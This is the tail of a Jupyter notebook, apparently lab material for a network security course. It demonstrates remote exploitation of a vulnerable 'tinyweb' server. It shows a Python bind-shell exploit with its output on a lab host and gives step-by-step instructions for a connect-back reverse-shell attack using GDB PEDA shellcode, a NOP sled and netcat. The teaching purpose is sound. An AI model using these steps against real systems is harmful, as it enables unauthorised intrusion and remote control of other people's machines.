      "print(f'Target {host} exploited... connecting to port: {bind_port}')\r\n",
      "\r\n",
      "# now connect to the shellcode PORT on victim\r\n",
      "io = connect(host, bind_port)\r\n",
      "io.interactive()\r\n",
      "\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# tinyweb exploit code in Python\n",
    "! cat demos/tinyweb/exploit.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run the exploit code from it's directory\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ python3 exploit.py\n",
    "[+] Opening connection to 192.168.195.167 on port 80: Done\n",
    "sled len = 244\n",
    "Target 192.168.195.167 exploited... connecting to port: 9999\n",
    "[+] Opening connection to 192.168.195.167 on port 9999: Done\n",
    "[*] Switching to interactive mode\n",
    "$ whoami\n",
    "user\n",
    "$ ls\n",
    "Makefile\n",
    "junk.txt\n",
    "local_exploit.bin\n",
    "main.cpp\n",
    "main.o\n",
    "port_bind_exploit.bin\n",
    "tinyweb.exe\n",
    "webroot\n",
    "$ exit\n",
    "[*] Got EOF while reading in interactive\n",
    "$ \n",
    "$ \n",
    "[*] Closed connection to 192.168.195.167 port 9999\n",
    "[*] Got EOF while sending in interactive\n",
    "[*] Closed connection to 192.168.195.167 port 80\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote Exploit - Connect-back Shellcode\n",
    "- connecting to the victim machine is not easy due to firewall and IDS, IPS, etc.\n",
    "- however, outgoing connection is typically allowed\n",
    "- use the following exploit!\n",
    "- use a different VM or system as an attacker machine\n",
    "- create connect back (TCP Reverse connect) shellcode\n",
    "- Generate Shellcode using GDB PEDA\n",
    "    - IP address must be the address of the attacker for victim to connect back\n",
    "    - Port can be any available higer port > 1024 on the attacker machine for victim to connect back to\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "\n",
    "\n",
    "```bash\n",
    "$ gdb -q\n",
    "gdb-peda$ shellcode generate x86/linux connect port ip\n",
    "\n",
    "```\n",
    "\n",
    "- write shellcode to a file as binary one line at a time\n",
    "- do one line at a time as following or use shellcode_writer.py script in shellcode folder\n",
    "\n",
    "```bash\n",
    "$ python3 -c 'import sys; sys.stdout.buffer.write(b\"shellcode line1\")' > reverse_tcp.bin\n",
    "$ python3 -c 'import sys; sys.stdout.buffer.write(b\"shellcode line2\")' >> reverse_tcp.bin\n",
    "...\n",
    "...\n",
    "```\n",
    "\n",
    "- calculate n and m to make exploit code\n",
    "    - `[<NOP sled>*n + len(reverse_tcp.bin) + <return address>*m]`\n",
    "- repeated return address = `<address of request> + 100`\n",
    "- run a server on attacker machine so the victim can connect back\n",
    "- port must be the same as used in the exploit code\n",
    "\n",
    "```bash\n",
    "$ nc -v -l -p port\n",
    "```\n",
    "\n",
    "- create the exploit code (connect_back_exploit_code.bin) as demonstrated in local exploit\n",
    "- send the expploit code to the Tinyweb server using netcat\n",
    "\n",
    "```bash\n",
    "$ cat connect_back_exploit_code.bin | nc -v <target ip> 80\n",
    "```\n",
    "- check the terminal running the netcat server to verify if the victim is exploited and connected back to the attacker "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
